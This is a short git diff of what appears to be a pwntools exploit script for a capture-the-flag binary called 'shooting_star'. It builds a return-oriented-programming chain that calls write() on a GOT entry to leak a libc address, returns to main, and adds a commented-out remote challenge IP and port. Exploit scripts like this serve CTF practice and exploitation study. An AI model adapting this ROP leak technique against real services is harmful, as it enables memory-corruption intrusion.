@@ -4,7 +4,7 @@ context.arch = 'amd64'
 context.log_level = 'debug'
 
 io = process('./shooting_star')
-#ip, port = 
+#ip, port = '165.227.237.190', 30652
 #io = remote(ip, port)
 
 elf = ELF('./shooting_star')
@@ -22,7 +22,7 @@ payload += p64(1)
 payload += p64(pop_rsi_r15_ret)
 payload += p64(elf.got.write)
 payload += p64(0)
-payload += p64(elf.plt.write)
+payload += p64(elf.sym.write)
 payload += p64(elf.sym.main)
 io.sendlineafter('>>', payload)
 io.recvuntil('\n')
@@ -30,7 +30,7 @@ io.recvuntil('\n')
 #print hex(u64(io.recv(6).ljust(8, b'\x00')))
 #gdb ./shooting_star -> b main -> r -> disassemble read to verify
 write_addr = u64(io.recv(6).ljust(8, b'\x00'))
-log.info("Leaked server's libc address, puts(): "+hex(write_addr))
+log.info("Leaked server's libc address, write(): "+hex(write_addr))
 
 #Connect to server and get server side write address, search in https://libc.blukat.me/
 
